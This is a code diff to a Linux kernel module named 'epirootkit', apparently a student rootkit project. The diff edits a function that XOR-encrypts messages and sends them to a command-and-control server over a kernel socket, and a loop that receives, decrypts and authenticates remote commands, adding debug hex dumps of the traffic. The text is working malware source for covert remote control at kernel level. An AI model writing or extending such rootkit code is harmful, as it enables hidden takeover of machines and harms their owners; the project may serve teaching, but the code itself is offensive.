@@ -87,29 +87,44 @@ static int send_to_c2(const char *msg, size_t len) {
     struct msghdr msg_hdr = {0};
     char *encrypted;
     int sent, i;
+    size_t key_len;
 
     if (!g_sock) {
         pr_err("epirootkit: Not connected, cannot send\n");
         return -ENOTCONN;
     }
 
-    // Allocate encrypted buffer
+    key_len = strlen(config.xor_key);
     encrypted = kmalloc(len, GFP_KERNEL);
     if (!encrypted) {
         pr_err("epirootkit: Failed to allocate memory for encrypted message\n");
         return -ENOMEM;
     }
 
+    // Debug print input
+    pr_debug("epirootkit: Sending message (len=%zu): ", len);
+    for (i = 0; i < len && i < 32; i++) {
+        pr_debug("%02x ", (unsigned char)msg[i]);
+    }
+    pr_debug("\n");
+
     // Encrypt the message
     for (i = 0; i < len; i++) {
-        encrypted[i] = msg[i] ^ config.xor_key[i % strlen(config.xor_key)];
+        unsigned char key_byte = config.xor_key[i % key_len];
+        unsigned char msg_byte = msg[i];
+        encrypted[i] = msg_byte ^ key_byte;
     }
 
-    // Setup the message vector
+    // Debug print output
+    pr_debug("epirootkit: Encrypted message: ");
+    for (i = 0; i < len && i < 32; i++) {
+        pr_debug("%02x ", (unsigned char)encrypted[i]);
+    }
+    pr_debug("\n");
+
     iov.iov_base = encrypted;
     iov.iov_len = len;
 
-    // Send the encrypted message
     sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
     if (sent < 0) {
         pr_err("epirootkit: Send failed (error %d)\n", sent);
@@ -149,13 +164,23 @@ static int command_loop(void *data) {
             continue;
         }
 
+        // Debug print received data
+        pr_debug("epirootkit: Received encrypted data (len=%d): ", len);
+        for (i = 0; i < len && i < 32; i++) {
+            pr_debug("%02x ", (unsigned char)buffer[i]);
+        }
+        pr_debug("\n");
+
         // Déchiffrement XOR
+        memset(decrypted, 0, sizeof(decrypted));
         for (i = 0; i < len; i++) {
-            decrypted[i] = buffer[i] ^ config.xor_key[i % strlen(config.xor_key)];
+            unsigned char key_byte = config.xor_key[i % strlen(config.xor_key)];
+            decrypted[i] = buffer[i] ^ key_byte;
         }
         decrypted[len] = '\0';
 
-        printk(KERN_DEBUG "epirootkit: Received %d bytes: %s\n", len, decrypted);
+        // Debug print decrypted data
+        pr_debug("epirootkit: Decrypted data: %s\n", decrypted);
 
         if (!authenticated) {
             printk(KERN_INFO "epirootkit: Received auth attempt: '%s'\n", decrypted);
